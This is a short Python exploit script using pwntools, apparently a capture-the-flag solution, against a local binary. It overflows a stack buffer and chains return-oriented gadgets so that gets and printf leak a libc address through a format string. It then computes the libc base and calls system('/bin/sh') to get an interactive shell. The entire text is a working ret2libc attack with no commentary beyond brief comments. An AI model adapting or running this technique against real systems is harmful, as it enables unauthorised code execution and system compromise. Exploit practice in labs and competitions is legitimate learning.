from pwn import *

r = process("./something")
gdb.attach(r, api=True)

inp_addr = 0x7fffffffdf30
ret_addr = 0x7fffffffdf58
offset = ret_addr - inp_addr

vuln = 0x00000000004011dd
main = 0x000000000040120e
ret_gadget = 0x000000000040101a
pop_rdi_ret_gadget = 0x00000000004012a3
fmtstr_addr = 0x404500
printf = 0x401080
gets = 0x401090
stdin_offset = 0x00000000001ec980
binshstr_offset = 0x1b45bd
system_offset = 0x00000000000522c0

print(r.recvuntil(b"thing :"))
# leak libc

# ROPchain
payload = b"A"*offset + p64(ret_gadget) + p64(pop_rdi_ret_gadget) + p64(fmtstr_addr) + p64(gets)
payload += p64(ret_gadget) + p64(pop_rdi_ret_gadget) + p64(fmtstr_addr) + p64(printf)
payload += p64(ret_gadget) + p64(vuln)
r.sendline(payload)
# formatstring leak stdin address
payload = b"%3$p"
r.sendline(payload)
output = r.recvuntil(b"thing :")
stdin = int(output.split(b"Say")[0][1:], 16)
libc_base = stdin - stdin_offset
print(hex(libc_base))
# call system("/bin/sh/")
payload = b"A"*offset + p64(ret_gadget) + p64(pop_rdi_ret_gadget) + p64(libc_base + binshstr_offset) + p64(libc_base + system_offset)
r.sendline(payload)

r.interactive()